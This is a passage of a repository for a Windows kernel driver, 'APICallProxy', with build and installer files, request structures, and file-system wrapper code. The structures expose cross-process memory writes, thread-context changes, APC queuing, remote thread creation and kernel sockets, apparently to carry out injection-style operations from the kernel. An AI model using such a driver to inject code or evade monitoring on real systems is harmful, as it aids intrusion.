		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|ARM64.ActiveCfg = Release|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|x64.ActiveCfg = Release|x64
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|x64.Build.0 = Release|x64
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|x86.ActiveCfg = Release|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|x86.Build.0 = Release|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|ARM.ActiveCfg = Debug|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|ARM64.ActiveCfg = Debug|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|x64.ActiveCfg = Debug|x64
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|x64.Build.0 = Debug|x64
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|x86.ActiveCfg = Debug|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Debug|x86.Build.0 = Debug|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|ARM.ActiveCfg = Release|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|ARM64.ActiveCfg = Release|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|x64.ActiveCfg = Release|x64
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|x64.Build.0 = Release|x64
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|x86.ActiveCfg = Release|Win32
		{A3CD5A6F-848D-480D-B8AD-64410602476D}.Release|x86.Build.0 = Release|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|ARM.ActiveCfg = Debug|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|ARM64.ActiveCfg = Debug|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|x64.ActiveCfg = Debug|x64
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|x64.Build.0 = Debug|x64
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|x86.ActiveCfg = Debug|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Debug|x86.Build.0 = Debug|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|ARM.ActiveCfg = Release|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|ARM64.ActiveCfg = Release|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|x64.ActiveCfg = Release|x64
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|x64.Build.0 = Release|x64
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|x86.ActiveCfg = Release|Win32
		{562688E7-71B3-4D28-9568-8F231240F403}.Release|x86.Build.0 = Release|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|ARM.ActiveCfg = Debug|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|ARM64.ActiveCfg = Debug|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|x64.ActiveCfg = Debug|x64
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|x64.Build.0 = Debug|x64
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|x86.ActiveCfg = Debug|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Debug|x86.Build.0 = Debug|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|ARM.ActiveCfg = Release|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|ARM64.ActiveCfg = Release|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|x64.ActiveCfg = Release|x64
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|x64.Build.0 = Release|x64
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|x86.ActiveCfg = Release|Win32
		{8D49460F-1B25-40E0-89CB-6778B18C969C}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {B7C0B7F7-184B-48F8-A6EC-C52E99356A20}
	EndGlobalSection
EndGlobal

```

`APICallProxy/APICallProxy/APICallProxy.inf`:

```inf
;
; APICallProxy.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=APICallProxy.cat
DriverVer= ; TODO: set DriverVer in stampinf property pages

[DestinationDirs]
DefaultDestDir = 12
APICallProxy_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
APICallProxy.sys  = 1,,
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll=1 ; make sure the number matches with SourceDisksNames

;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]
%APICallProxy.DeviceDesc%=APICallProxy_Device, Root\APICallProxy ; TODO: edit hw-id

[APICallProxy_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
APICallProxy.sys

;-------------- Service installation
[APICallProxy_Device.NT.Services]
AddService = APICallProxy,%SPSVCINST_ASSOCSERVICE%, APICallProxy_Service_Inst

; -------------- APICallProxy driver install sections
[APICallProxy_Service_Inst]
DisplayName    = %APICallProxy.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\APICallProxy.sys

;
;--- APICallProxy_Device Coinstaller installation ------
;

[APICallProxy_Device.NT.CoInstallers]
AddReg=APICallProxy_Device_CoInstaller_AddReg
CopyFiles=APICallProxy_Device_CoInstaller_CopyFiles

[APICallProxy_Device_CoInstaller_AddReg]
HKR,,CoInstallers32,0x00010000, "WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll,WdfCoInstaller"

[APICallProxy_Device_CoInstaller_CopyFiles]
WdfCoInstaller$KMDFCOINSTALLERVERSION$.dll

[APICallProxy_Device.NT.Wdf]
KmdfService =  APICallProxy, APICallProxy_wdfsect
[APICallProxy_wdfsect]
KmdfLibraryVersion = $KMDFVERSION$

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "APICallProxy Installation Disk"
APICallProxy.DeviceDesc = "APICallProxy Device"
APICallProxy.SVCDESC = "APICallProxy Service"

```

`APICallProxy/APICallProxy/APICallProxy.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{007F48A4-2B27-410C-91AF-BCEE273877CA}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>APICallProxy</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>WindowsV6.3</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>
    </DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>
    </TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>
    </DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <Inf2CatUseLocalTime>true</Inf2CatUseLocalTime>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Link>
      <AdditionalDependencies>netio.lib;%(AdditionalDependencies);$(KernelBufferOverflowLib);$(DDK_LIB_PATH)ntoskrnl.lib;$(DDK_LIB_PATH)hal.lib;$(DDK_LIB_PATH)wmilib.lib;$(KMDF_LIB_PATH)$(KMDF_VER_PATH)\WdfLdr.lib;$(KMDF_LIB_PATH)$(KMDF_VER_PATH)\WdfDriverEntry.lib</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="APICallProxy.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="CommonStruct.h" />
    <ClInclude Include="FileSystem.h" />
    <ClInclude Include="General.h" />
    <ClInclude Include="IOCTLCodes.h" />
    <ClInclude Include="Network.h" />
    <ClInclude Include="Process.h" />
    <ClInclude Include="Prototypes.h" />
    <ClInclude Include="Registry.h" />
    <ClInclude Include="Struct.h" />
    <ClInclude Include="Thread.h" />
    <ClInclude Include="Utility.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/APICallProxy/APICallProxy.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="APICallProxy.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="CommonStruct.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="FileSystem.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="General.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="IOCTLCodes.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Process.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Prototypes.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Struct.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Thread.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Utility.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Registry.h">
      <Filter>Source Files</Filter>
    </ClInclude>
    <ClInclude Include="Network.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`APICallProxy/APICallProxy/CommonStruct.h`:

```h
#pragma once


#define MAX_PATH 260
#define MAX_SECTION_NAME 100

typedef struct _RegistryKeyQuery {
	WCHAR RegistryKeyToQuery[50];
	WCHAR REgstryKeyPath[500];
} RegistryKeyQuery, * PRegistryKeyQuery;

typedef struct _READWRITEDATA {
	_In_ HANDLE			FileHandle;
	_In_ ULONG			DataLen;
	_In_ LARGE_INTEGER	ByteOffset;	//Start offset in the file for read or write
	unsigned char* Data;
} ReadWriteData, * PReadWriteData;

typedef struct _CreateFileInfo {
	_In_ WCHAR			FileName[MAX_PATH + 16];
	_In_ ACCESS_MASK	DesiredAccess;	//refere to MSDN for information
	_In_ ULONG			ShareAccess;
	_In_ ULONG			CreateDisposition;
} CreateFileInfo, * PCreateFileSInfo;

typedef struct _QuerySystemInformationInfo {
	_In_ ULONG		InformationClass;
	_Inout_ ULONG	DataSize;
	_In_ PVOID		Data;
} QuerySystemInformationInfo, * PQuerySystemInformationInfo;

typedef struct _AllocateVirtualMeomryInfo {
	_In_ HANDLE     ProcessHandle;
	_Inout_ PVOID	BaseAddress;
	_In_ SIZE_T		RegionSize;
	_In_ ULONG		AllocationType;
	_In_ ULONG		Protect;

} AllocateVirtualMeomryInfo, * PAllocateVirtualMeomryInfo;

typedef struct _FreeVirtualMeomryInfo {
	_In_ HANDLE     ProcessHandle;
	_Inout_ PVOID	BaseAddress;

} FreeVirtualMeomryInfo, * PFreeVirtualMeomryInfo;

typedef struct _ReadWriteVirtualMemoryInfo {
	_In_ HANDLE     ProcessHandle;
	_In_ SIZE_T	    DataLen;
	_In_ PVOID		BaseAddress;
	_In_ PVOID		Data;

} ReadWriteVirtualMemoryInfo, * PReadWriteVirtualMemoryInfo;

typedef struct _CreateSectionInfo {
	_In_ ACCESS_MASK     DesiredAccess;
	_In_ LARGE_INTEGER	 SectionMaxSize;
	_In_ WCHAR			 SectionName[MAX_SECTION_NAME];			//Optenal Can Be left Zero
	_In_ ULONG			 SectionPageProtection;
	_In_ ULONG			 AllocationAttribute;
	_In_ HANDLE			 FileHandle;

} CreateSectionInfo, * PCreateSectionInfo;

typedef struct _MapViewOfSectionInfo {
	_In_ HANDLE     SectionHandle;
	_In_ HANDLE		ProcessHandle;
	_In_ PVOID		BaseAddress;
	_In_ SIZE_T		CommetSize;
	_In_ SIZE_T		SizeOfView;
	_In_ ULONG Win32Protect;

} MapViewOfSectionInfo, * PMapViewOfSectionInfo;

typedef struct _UNMapViewOfSectionInfo {
	_In_ HANDLE     ProcessHandle;
	_In_ PVOID		BaseAddress;

} UNMapViewOfSectionInfo, * PUNMapViewOfSectionInfo;

typedef struct _OpenSectionInfo {
	_In_ ACCESS_MASK     DesiredAccess;
	_In_ WCHAR			 SectionName[MAX_SECTION_NAME];			//Optenal Can Be left Zero

} OpenSectionInfo, * POpenSectionInfo;

typedef struct _ThreadContextInfo {
	_In_ DWORD64     ThreadID;
	_In_ CONTEXT	ThreadContext;

} ThreadContextInfo, * PThreadContextInfo;

typedef struct _VirtualProtectInfo {
	_In_ HANDLE		ProcessHandle;
	_In_ PVOID		BaseAddress;
	_In_ SIZE_T		NumberOfBytesToProtect;
	_In_ ULONG		NewAccessProtection;
	OUT  ULONG		OldAccessProtection;

} VirtualProtectInfo, * PVirtualProtectInfo;

typedef struct _QueueUSerApcInfo {
	_In_ HANDLE		ThreadHandle;
	_In_ DWORD64	ProcAddres;
	_In_ PVOID		ArgumentData;

} QueueUSerApcInfo, * PQueueUSerApcInfo;


typedef struct _OpenCreateRegistryInfo {
	_In_ WCHAR			RegistryKeyPath[600];
	_In_ ACCESS_MASK	DesiredAccess;			//refere to MSDN for information
	OUT  ULONG			CreateDisposition;		//Key created or opened ( used only in ZwCreateKey() )

} OpenCreateRegistryInfo, * POpenCreateRegistryInfo;

typedef struct _RegistrySetValueInfo {
	_In_ WCHAR			KeyName[600];
	_In_ HANDLE			KeyHandle;			
	_In_ ULONG			Type;
	_In_ PVOID			Date;
	_In_ ULONG			DateSize;

} RegistrySetValueInfo, * PRegistrySetValueInfo;

typedef struct _RegistryQueryKeyValueInfo {
	_In_ HANDLE			KeyHandle;
	_In_ WCHAR			ValueName[100];
	_In_ ULONG			KeyValueInformationClass;
	_In_ PVOID			Data;
	_In_ ULONG			DateSize;
	_In_ PULONG         ResultLength;

} RegistryQueryKeyValueInfo, * PRegistryQueryKeyValueInfo;

typedef struct _WSAStartCleanUp {
	_In_ PVOID		WskRegistrationPtr;
	_In_ PVOID		WskProviderPtr;
	_In_ PVOID		WskDispatchPtr;

} WSAStartCleanUp, * PWSAStartCleanUp;

typedef struct _SocketStruct {
	_In_ WSAStartCleanUp WSAStartCleanUpptr;
	_In_ INT			 Domain;
	_In_ INT			 Type;
	_In_ INT			 Protocol;
	_In_ ULONG			 Flags;
	OUT PVOID			 Socket;

} SocketStruct, * PSocketStruct;

typedef struct _ConnectStruct {
	_In_ PVOID			  Socket;
	_In_ struct addrinfo* AddrInfo;

} ConnectStruct, * PConnectStruct;


typedef struct _GetAddrInfoStruct {
	_In_    WSAStartCleanUp			 SocketInfo;
	_In_    CHAR*					 Node;
	_In_    CHAR*					 Service;
	_In_    struct addrinfo*		 Hints;
	_Inout_ struct addrinfo**		 Result;

} GetAddrInfoStruct, * PGetAddrInfoStruct;


typedef struct _SendRecvStruct {
	_In_ PVOID    Socket;
	_In_ PVOID	  Buffer;
	_In_ ULONG	  BufferLen;

} SendRecvStruct, * PSendRecvStruct;

typedef struct _SendToRecvFromStruct {
	_In_ PVOID				Socket;
	_In_ PVOID				Buffer;
	_In_ ULONG				BufferLen;
	OUT  struct sockaddr*   AddressInfo;
	OUT  ULONG*			    AddressinfoLen;

} SendToRecvFromStruct, * PSendToRecvFromStruct;

typedef struct _BindStruct {
	_In_ PVOID				 Socket;
	_In_ struct sockaddr*	 Address;

} BindStruct, * PBindStruct;

typedef struct _AcceptStruct {
	_In_ PVOID				    Socket;
	_In_ struct sockaddr_in*	Address;
	OUT INT*					SocketLen;
	OUT  PVOID					NewSocket;
} AcceptStruct, * PAcceptStruct;



typedef struct _CreateThreadStruct {
	_In_ HANDLE				    ThreadHandle;
	_In_ PVOID					StartAddress;
	_In_ PVOID					Parameter;
	OUT  DWORD64				TID;
} CreateThreadStruct, * PCreateThreadStruct;
```

`APICallProxy/APICallProxy/FileSystem.h`:

```h
#pragma once


NTSTATUS APIProxyCreateFile(CreateFileInfo* FileInfo, HANDLE* FileHandle) {
	NTSTATUS Status = STATUS_SUCCESS;

	UNICODE_STRING uniName;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	IO_STATUS_BLOCK ioStatusBlock;

	__try {
		RtlInitUnicodeString(&uniName, FileInfo->FileName);

		InitializeObjectAttributes(&objAttr, &uniName,
			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
			NULL, NULL);

		//Map the user creation option to kernel flags
#define  CREATE_ALWAYS  2 
#define  CREATE_NEW		1
#define  OPEN_ALWAYS	4 
#define  OPEN_EXISTING  3

		ULONG CreateOption = FILE_CREATE;
		switch (FileInfo->CreateDisposition)
		{
		case CREATE_ALWAYS:
			CreateOption = FILE_SUPERSEDE;
			break;
		case CREATE_NEW:
			CreateOption = FILE_CREATE;
			break;
		case OPEN_ALWAYS:
			CreateOption = FILE_OPEN_IF;
			break;
		case OPEN_EXISTING:
			CreateOption = FILE_OPEN;
			break;
		default:
			break;
		}

		Status = ZwCreateFile(FileHandle, FileInfo->DesiredAccess,
			&objAttr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL,
			FileInfo->ShareAccess, CreateOption, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Create File %wZ Status Code 0x%x\n", uniName, Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Creating File Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}

NTSTATUS APIProxyOpenFile(CreateFileInfo* FileInfo, HANDLE* FileHandle) {

	NTSTATUS Status = STATUS_SUCCESS;
	UNICODE_STRING uniName;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
	IO_STATUS_BLOCK ioStatusBlock;

	__try {
		RtlInitUnicodeString(&uniName, FileInfo->FileName);

		InitializeObjectAttributes(&objAttr, &uniName,
			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
			NULL, NULL);

		Status = ZwOpenFile(FileHandle, FileInfo->DesiredAccess, &objAttr, &ioStatusBlock, FileInfo->ShareAccess, FILE_SYNCHRONOUS_IO_NONALERT);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Open File %wZ Status Code 0x%x\n", uniName, Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Opening File Status Code 0x%x\n", Status);

#endif

	}
	return Status;
}

NTSTATUS APIProxyDeleteFile(WCHAR* FileName) {

	NTSTATUS Status = STATUS_SUCCESS;

	UNICODE_STRING uniName;
	OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };

	__try {
		RtlInitUnicodeString(&uniName, FileName);

		InitializeObjectAttributes(&objAttr, &uniName,
			OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
			NULL, NULL);

		Status = ZwDeleteFile(&objAttr);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Delete File %wZ Status Code 0x%x\n", uniName, Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Deleting File Status Code 0x%x\n", Status);
#endif

	}

	return Status;
}

NTSTATUS APIProxyWriteFile(ReadWriteData* WriteInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	IO_STATUS_BLOCK ioStatusBlock;

	__try {
		Status = ZwWriteFile(WriteInfo->FileHandle, NULL, NULL, NULL, &ioStatusBlock, WriteInfo->Data, WriteInfo->DataLen, &(WriteInfo->ByteOffset), NULL);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: Error Write Data to file Status Code 0x%x\n", Status);
		}
#endif 

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Writing data to File Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyReadFile(ReadWriteData* ReadInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
	IO_STATUS_BLOCK ioStatusBlock;

	__try {
		Status = ZwReadFile(ReadInfo->FileHandle, NULL, NULL, NULL, &ioStatusBlock, ReadInfo->Data, ReadInfo->DataLen, &(ReadInfo->ByteOffset), NULL);
#if DEBUG
		if (!NT_SUCCESS(Status)) {
			DbgPrint("APICallProxy: ErrorRead Data From File Status Code 0x%x\n", Status);
		}
#endif 
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		Status = STATUS_ACCESS_VIOLATION;
#if DEBUG
		DbgPrint("APICallProxy: Error Access Violation while Reading Data From File Status Code 0x%x\n", Status);
#endif

	}
	return Status;
}

NTSTATUS APIProxyGetFileSize(HANDLE* FileHandle, FILE_STANDARD_INFORMATION* FileInfo) {
	NTSTATUS Status = STATUS_SUCCESS;
